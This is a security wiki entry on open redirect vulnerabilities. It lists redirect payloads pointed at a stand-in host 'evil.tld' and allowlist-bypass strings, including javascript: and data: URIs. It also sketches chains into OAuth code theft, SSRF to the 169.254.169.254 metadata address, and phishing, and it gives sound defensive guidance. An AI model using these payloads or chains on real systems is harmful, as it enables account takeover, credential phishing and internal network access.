---
title: Open redirect
slug: open-redirect
---

> **TL;DR:** The app sends a 30x or sets `window.location` to a value the attacker picked — useful alone for phishing, decisive when chained into OAuth token theft and SSRF allowlist bypass.

## What it is
An open redirect is any code path that converts attacker-controlled input into a navigation target without strict same-origin validation. The bug is rated low severity by itself but is a top-tier chain primitive: OAuth `redirect_uri` allowlists that accept arbitrary paths under a trusted origin, SSO `RelayState` that returns to an arbitrary URL after auth, and SSRF filters that allowlist a host but follow its redirects.

## Preconditions / where it applies
- A parameter that controls navigation: `?next=`, `?return_to=`, `?continue=`, `?redirect_uri=`, `?url=`, `?dest=`, `?target=`, `?back=`, `?ref=`, `?u=`.
- The redirect happens via 30x Location, meta refresh, JS `location.href`, `window.open`, or a server-side fetch followed by reflection.

## Technique
Direct payloads — try a domain you control:

```
https://target.com/login?next=https://evil.tld/
https://target.com/login?next=//evil.tld/
https://target.com/login?next=/\\evil.tld/
```

Bypasses for allowlist code that only checks string prefix or only forbids `://`:

```
?next=https://target.com.evil.tld/      # suffix concat
?next=https://target.com@evil.tld/      # userinfo
?next=https://evil.tld/.target.com      # contains "target.com"
?next=//evil.tld/                       # scheme-relative
?next=/\evil.tld                        # backslash → some parsers
?next=//google.com/%2F..%2F..%2Fevil    # redirect chain via trusted host
?next=javascript:alert(1)               # XSS where href is set client-side
?next=data:text/html,<script>...        # data URI
```

Browser URL parsing differs from server URL parsing — this is the entire game. Test `whatwg-url` (browsers) vs Python `urllib`, Node `url.parse`, Go `net/url`, Java `URI` — many disagree on `\`, `;`, `%5C`, `%2E%2E`, and userinfo.

Chains:

- **OAuth token theft** — attacker registers `redirect_uri=https://target.com/cb?next=//evil.tld`, the IdP allow-lists `target.com/cb`, the callback redirects to `//evil.tld?code=...`. See [[oauth-token-theft]].
- **SAML RelayState** — same idea, post-auth landing arbitrary.
- **SSRF allow bypass** — internal fetch policy allows `target.com`, target redirects to `169.254.169.254` (or DNS rebinding). See [[ssrf]].
- **CSP bypass** — open redirect on a trusted origin lets an attacker chain through it to exfil ([[content-security-policy-bypass]]).
- **Phishing kit** — `bank.com/login?next=evilbank.com/login` puts the attacker URL in a real bank email.

## Detection and defence
- Allowlist by parsed host equality, not substring. Use the platform URL parser, then compare `.hostname` and `.protocol`.
- Where possible, store the post-action target server-side keyed to a one-time token, not in the URL.
- Reject `javascript:`, `data:`, `vbscript:`, `file:` schemes explicitly.
- Render an interstitial ("You are leaving target.com → evil.tld") for any external redirect.
- For OAuth, exact-match the full redirect_uri including path and query; do not accept open-redirect downstream.
- Logs: high redirect rate to off-domain hosts from a single source IP, or referer mismatches.

See also [[ssrf]], [[oauth-token-theft]], [[content-security-policy-bypass]].

## References
- [OWASP – Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) — control list
- [PortSwigger – Open redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) — issue definition
- [PayloadsAllTheThings – Open redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect) — bypass payloads
